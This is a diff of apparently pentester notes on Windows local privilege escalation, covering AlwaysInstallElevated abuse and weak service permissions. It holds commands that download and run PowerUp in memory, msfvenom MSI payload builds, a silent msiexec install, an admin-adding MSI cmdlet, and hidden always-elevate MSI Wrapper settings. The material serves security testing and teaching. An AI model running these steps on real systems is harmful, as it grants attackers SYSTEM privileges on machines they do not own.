@@ -26,7 +26,7 @@ current system:
 | **Curent User** | `whoami /all` <br/> `net user %username%`  | `$env:UserName` | (PS) `(Get-WmiObject Win32_ComputerSystem).UserName` |
 | **Local users** | `net users` <br/> `net users <USERNAME>` | `Get-LocalUser` | `wmic USERACCOUNT list full` <br> (PS) `Get-WMIObject Win32_UserAccount -NameSpace "root\CIMV2" -Filter "LocalAccount='$True'"` |
 | **Local groups** | `net localgroup` | *(Win10+)* `Get-LocalGroup` | `wmic group list full` |
-| **Local group users** | `net localgroup Administrators` <br/> `net localgroup <GROUPNAME>` | `Get-LocalGroupMember -Name "<GROUPNAME>"` | |
+| **Local groups' member(s)** | `net localgroup Administrators` <br/> `net localgroup <GROUPNAME>` | `Get-LocalGroupMember -Name "<GROUPNAME>"` <br/><br/> `foreach ($group in Get-LocalGroup) { [PSCustomObject]@{ Group = $group.Name; User = (($group \| Get-LocalGroupMember).Name \| Out-String) } \| fl }` | |
 | **Connected users** | `qwinsta` | | |
 | **Powershell version**  | `Powershell  $psversiontable` | `$psversiontable` | |
 | **Environement variables** | `set` | `Get-ChildItem Env: \| ft Key,Value` | |
@@ -1014,62 +1014,77 @@ advantage of not relying on the `RPC` or `SMB` protocols as the
 
 ### AlwaysInstallElevated policy
 
-Windows provides a mechanism which allows unprivileged user to install Windows
-installation packages, Microsoft Windows Installer Package (MSI) files,
-with NT AUTHORITY\SYSTEM privileges. This policy is known as
+Windows provides a mechanism which allows unprivileged users to install Windows
+installation packages, `Microsoft Windows Installer Package (MSI)` files,
+with `NT AUTHORITY\SYSTEM` privileges. This policy is known as
 `AlwaysInstallElevated`.
 
 If activated, this mechanism can be leveraged to elevate privileges on the
-system by executing code through the MSI during the installation process as
-NT AUTHORITY\SYSTEM.    
+system by executing code through the `MSI` during the installation process as
+`NT AUTHORITY\SYSTEM`.
 
-The Windows built-in `req query` and the the `Powershell` `PowerUp` script can
-be used to check whether the `AlwaysInstallElevated` policy is deployed on the
-host be querying the registry:
+The Windows built-in `req` utility and the `PowerUp` PowerShell script can be
+used to check whether the `AlwaysInstallElevated` policy is enabled on the
+host by querying the associated registry key:
 
 ```
-# If "REG_DWORD 0x1" is returned the policy is activated
-# If not, the error message "ERROR: The system was unable to find the specified registry key or value." indicates that the policy is not set
+# If "REG_DWORD 0x1" is returned the policy is activated.
+# If not, the error message "ERROR: The system was unable to find the specified registry key or value." indicates that the policy is not set.
 
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
-# (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated
+# (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated.
 PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
 PS> Get-RegistryAlwaysInstallElevated
-
-meterpreter> load powershell
-meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
-meterpreter> powershell_execute Get-RegistryAlwaysInstallElevated
 ```
 
-The policy can be abused through a `meterpreter` session using the `Metasploit`
-module `exploit/windows/local/always_install_elevated`, by crafting a MSI with
-`msfvenom` or using the `Powershell` `PowerUp` script.
+The policy can be abused to elevate privileges:
 
-Note that the `Metasploit` module
-`exploit/windows/local/always_install_elevated` will prevent the installation
-from succeeding to avoid the registration of the program on the system.  
+  - By executing a given binary or `bat` script through a specifically crafted
+    `MSI` installer using the
+    [`MSI Wrapper`](https://www.exemsi.com/download/) graphical application or
+    `msfvenom`.
+
+  - By adding a local user to the local `Administrators` group using the
+    `MSI` installer embedded in the `PowerUp`'s `Write-UserAddMSI` PowerShell
+    cmdlet. The cmdlet will open a graphical interface to specify the user to
+    be added.
+
+  - Through a `meterpreter` session using the `Metasploit`'s
+    `exploit/windows/local/always_install_elevated` module. The module will
+    prevent the installation from succeeding to avoid the registration of the
+    program on the system.
+
+Refer to the `[General] File transfer` note for file transfer techniques to
+upload the MSI on the targeted system.
 
 ```
-# Requires a meterpreter session
-msf> use exploit/windows/local/always_install_elevated
-
-# msfvenom can be used to generate a MSI starting a Metasploit payload or using a provided binary  
-# Refer to the "[General] Shells" note for generating binaries that can bypass anti-virus detection
-# Refer to the "[General] File transfer" note for file transfer techniques to upload the MSI on the targeted system
-
+# msfvenom can be used to generate a MSI starting a Metasploit payload or using a provided binary.
 msfvenom -p <PAYLOAD> -f msi-nouac > <MSI_FILE>
 msfvenom -p windows/exec cmd="<BINARY_PATH>" -f msi-nouac > <MSI_FILE>
 
-# /quiet: no messages displayed, /qn: no GUI, /i runs as current user
+# MSI Wrapper procedure to generate an MSI that will execute the given binary under elevated privileges:
+Executable (2nd page onward)      -> specify the executable to be executed
+                                  -> Compression of wrapped file: None
+Visibility in Apps & features     -> Visibility of MSI package: Hidden
+Security and User context         -> Security context for lauching the executable: Windows Installer
+                                  -> Elevation when launching the executable: Always elevate
+                                  -> MSI installation context: Per User
+                                  -> Check MSI package requires elevation
+Application Ids                   -> Upgrade code: Create New.
+-> Next -> [...] -> Build.
+
+# Installs the specifed MSI file.
+# /quiet: no messages displayed, /qn: no GUI, /i runs as current user.
 msiexec /quiet /qn /i <MSI_PATH>
 
 # (PowerShell) PowerSploit's PowerUp Write-UserAddMSI
-# Prompt a GUI interface to specify the user to be added
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
-erSploit/master/Privesc/PowerUp.ps1")
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
 Write-UserAddMSI
+
+# Requires a meterpreter session.
+msf> use exploit/windows/local/always_install_elevated
 ```
 
 ### Services misconfigurations
@@ -1109,8 +1124,105 @@ sc queryex <SERVICE_NAME>
 ###### Weak services permissions
 
 A weak service permissions vulnerability occurs when an unprivileged user can
-alter the service configuration so that the service runs a specified command or
-executable.  
+alter the service configuration so that the service runs an arbitrary
+specified command or executable.
+
+The rights on the service are defined in each service's security descriptor,
+formatted according to the `Security Descriptor Definition Language (SDDL)`
+definition. The `SDDL` defines the `System Access Control List and (SACL)` and
+the `Discretionary Access Control List (DACL)`:
+  - Prefix of S: `SACL` which controls the auditing (what access will generate
+    an auditing event).
+  - Prefix of D: `DACL` which controls the actual permissions / rights over the
+    services (and will govern the access to the service).
+
+The `SDDL` uses `Access Control Entry (ACE)` strings in the `DACL` and `SACL`
+components of a security descriptor string. Each `ACE` in a security descriptor
+string is enclosed in parentheses in which an user account and their associated
+permissions / rights are represented.
+
+The fields of the `ACE` are in the following order and are separated by
+semicolons (;).
+
+```
+ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
+```
+
+In case of services, the fields `ace_type`, `rights` and `account_sid` are
+usually the only ones being set.
+
+The `ace_type` field is usually either set to `Allow (A)` or `Deny (D)`. The
+`rights` field is a string that indicates the access rights controlled by
+the `ACE`, usually composed of pair of letters each representing a specific
+permission. Finally, the `account_sid` represent the security principal
+assigned with the permissions and can either be a two letters known alias or a
+`SID`.
+
+The following known aliases can be encountered:
+
+| Alias | Name |
+|-------|-----------------------------------------|
+| `AN` | Anonymous logon |
+| `AO` | Account operators |
+| `AU` | Authenticated users |
+| `BA` | Built-in administrators |
+| `BG` | Built-in guests |
+| `BO` | Backup operators |
+| `BU` | Built-in users |
+| `CA` | Certificate server administrators |
+| `CG` | Creator group |
+| `CO` | Creator owner |
+| `DA` | Domain administrators |
+| `DC` | Domain computers |
+| `DD` | Domain controllers |
+| `DG` | Domain guests |
+| `DU` | Domain users |
+| `EA` | Enterprise administrators |
+| `ED` | Enterprise domain controllers |
+| `IU` | Interactively logged-on user |
+| `LA` | Local administrator |
+| `LG` | Local guest |
+| `LS` | Local service account |
+| `NO` | Network configuration operators |
+| `NS` | Network service account |
+| `NU` | Network logon user |
+| `PA` | Group Policy administrators |
+| `PO` | Printer operators |
+| `PS` | Personal self |
+| `PU` | Power users |
+| `RC` | Restricted code |
+| `RD` | Terminal server users |
+| `RE` | Replicator |
+| `RS` | RAS servers group |
+| `RU` | Alias to allow previous Windows 2000 |
+| `SA` | Schema administrators |
+| `SO` | Server operators |
+| `SU` | Service logon user |
+| `SY` | Local system |
+| `WD` | Everyone |
+
+The following permissions are worth mentioning in the prospect of local
+privilege escalation:
+
+| Ace's rights | Access right | Description |
+|--------------|--------------|-------------|
+| - | `SERVICE_ALL_ACCESS` | Include all service permissions, notably `SERVICE_CHANGE_CONFIG`. |
+| `CC` | `SERVICE_QUERY_CONFIG` | Retrieve the service's current configuration from the SCM. |
+| `DC` | `SERVICE_CHANGE_CONFIG` | Change the service configuration, notably grant the right to change the executable file associated with the service. |
+| `GA` | `GENERIC_ALL` | Equivalent to all the generic access rights  (read, write and execute access to the service). |
+| `GX` | `GENERIC_WRITE` | Equivalent to `SERVICE_QUERY_STATUS` and `SERVICE_CHANGE_CONFIG`. |
+| `LC` | `SERVICE_QUERY_STATUS` | Retrieve the service's current status from the SCM. |
+| `LO` | `SERVICE_INTERROGATE` | Retrieve the service's current status directly from the service itself. |
+| `RC` | `READ_CONTROL` | Read the security descriptor of the service. |
+| `RP` | `SERVICE_START` | Start the service. |
+| `SW` | `SERVICE_ENUMERATE_DEPENDENTS` | List the services that depend on the service. |
+| `WD` | `WRITE_DAC` | Modify the DACL of the service in its security descriptor. |
+| `WO` | `WRITE_OWNER` | Change the owner of the service in its security descriptor. |
+| `WP` | `SERVICE_STOP` | Stop the service. |
+
+A more comprehensive list of the access rights for Windows services can be
+found in the
+[official Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).
 
 The `accesschk` tool, from the `Sysinternals` suite, and the `Powershell`
 `PowerUp` script can be used to list the services an user can exploit:
@@ -1146,107 +1258,26 @@ meterpreter> powershell_execute Get-ModifiableServiceFile
 meterpreter> powershell_execute Get-ModifiableService
 ```
 
-If the tools above are not a possibility, the Windows built-in `sc` can be used
-to directly retrieve a service's security descriptor composed of the System
-Access Control List and (SACL) and Discretionary Access Control List (DACL).
+If the use of the tools above is not a possibility, the Windows built-in `sc`
+can be used to directly retrieve a service's security descriptor's `DACL` (but
+not the owner of the service nor the it's `SACL`):
 
 ```
 sc sdshow <SERVICE_NAME>
+
+# Lists the DACL's ACE of the specified service, excluding rights granted to privileged principals.
+$sddl = sc.exe sdshow <SERVICE_NAME> | where { $_ }
+$sddl.split('(') | Select-String -NotMatch 'D:', 'BA', 'LA', 'SY', 'PU'
+
+# Enumerates the DACL's ACE of all services, excluding rights granted to privileged principals.
+Get-Service | % { Write-Host $_.Name; $sddl = sc.exe sdshow $_.Name ; $sddl.split('(') | Select-String -NotMatch 'D:', 'BA', 'LA', 'SY', 'PU'; Write-Host "`n`n" }
+
+# Enumerates the rights granting modification privileges of all services, excluding rights granted to privileged principals.
+Get-Service | % { Write-Host $_.Name; $sddl = sc.exe sdshow $_.Name ; $sddl.split('(') | Select-String -NotMatch 'BA', 'LA', 'SY', 'PU' | Select-String ';-;', 'DC', 'GA', 'GX', 'WD', 'WO' | Select-String -NotMatch 'WD\)'; Write-Host "`n`n" }
 ```
 
-The security descriptor, as displayed by `sc sdshow`, is formatted according
-the Security Descriptor Definition Language (SDDL) and will usually be divided
-into two parts:
-  - Prefix of S: SACL and controls auditing
-  - Prefix of D: DACL and controls permissions
-
-The SDDL uses Access Control Entry (ACE) strings in the DACL and SACL
-components of a security descriptor string. Each ACE in a security descriptor
-string is enclosed in parentheses in which an user account and their associated
-permissions are represented.
-
-The fields of the ACE are in the following order and are separated by
-semicolons (;)
-
-```
-ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
-```
-
-In case of services, the fields `ace_type`, `rights` and `account_sid` are
-usually the only ones being set.
-
-The `ace_type` field is usually either set to Allow (A) or Deny (D). The
-`rights` field is a string that indicates the access rights controlled by
-the ACE, usually composed of pair of letters each representing a specific
-permission. Finally, the `account_sid` represent the security principal
-assigned with the permissions and can either be a two letters known alias or a
-SID.
-
-The following known aliases can be encountered:
-
-| Alias | Name |
-|-------|-----------------------------------------|
-| AO | Account operators |
-| RU | Alias to allow previous Windows 2000 |
-| AN | Anonymous logon |
-| AU | Authenticated users |
-| BA | Built-in administrators |
-| BG | Built-in guests |
-| BO | Backup operators |
-| BU | Built-in users |
-| CA | Certificate server administrators |
-| CG | Creator group |
-| CO | Creator owner |
-| DA | Domain administrators |
-| DC | Domain computers |
-| DD | Domain controllers |
-| DG | Domain guests |
-| DU | Domain users |
-| EA | Enterprise administrators |
-| ED | Enterprise domain controllers |
-| WD | Everyone |
-| PA | Group Policy administrators |
-| IU | Interactively logged-on user |
-| LA | Local administrator |
-| LG | Local guest |
-| LS | Local service account |
-| SY | Local system |
-| NU | Network logon user |
-| NO | Network configuration operators |
-| NS | Network service account |
-| PO | Printer operators |
-| PS | Personal self |
-| PU | Power users |
-| RS | RAS servers group |
-| RD | Terminal server users |
-| RE | Replicator |
-| RC | Restricted code |
-| SA | Schema administrators |
-| SO | Server operators |
-| SU | Service logon user |
-
-The following permissions are worth mentioning in the prospect of local
-privilege escalation:
-
-
-| Ace's rights | Access right | Description |
-|--------------|--------------|-------------|
-| CC | SERVICE_QUERY_CONFIG | Retrieve the service's current configuration from the SCM |
-| DC | SERVICE_CHANGE_CONFIG | Change the service configuration, notably grant the right to change the executable file associated with the service |
-| GA | GENERIC_ALL | Read, write and execute access to the service |
-| GX | GENERIC_WRITE | Write access to the service |
-| LC | SERVICE_QUERY_STATUS | Retrieve the service's current status from the SCM |
-| LO | SERVICE_INTERROGATE | Retrieve the service's current status directly from the service itself |
-| RC | READ_CONTROL | Read the security descriptor of the service |
-| RP | SERVICE_START | Start the service |
-| SW | SERVICE_ENUMERATE_DEPENDENTS | List the services that depend on the service |
-| WD | WRITE_DAC | Modify the DACL of the service in its security descriptor |
-| WO | WRITE_OWNER | Change the owner of the service in its security descriptor |
-| WP | SERVICE_STOP | Stop the service |
-| - | SERVICE_ALL_ACCESS | Include all service permissions, notably SERVICE_CHANGE_CONFIG |
-
-The full list can be re
-To alter the service configuration:
+The `sc` utility can, among others, also be used to alter a service
+configuration:
 
 ```
 # A space is required after binPath=
@@ -1683,3 +1714,4 @@ https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
 https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/
 https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/
 https://itm4n.github.io/localservice-privileges/
+https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights
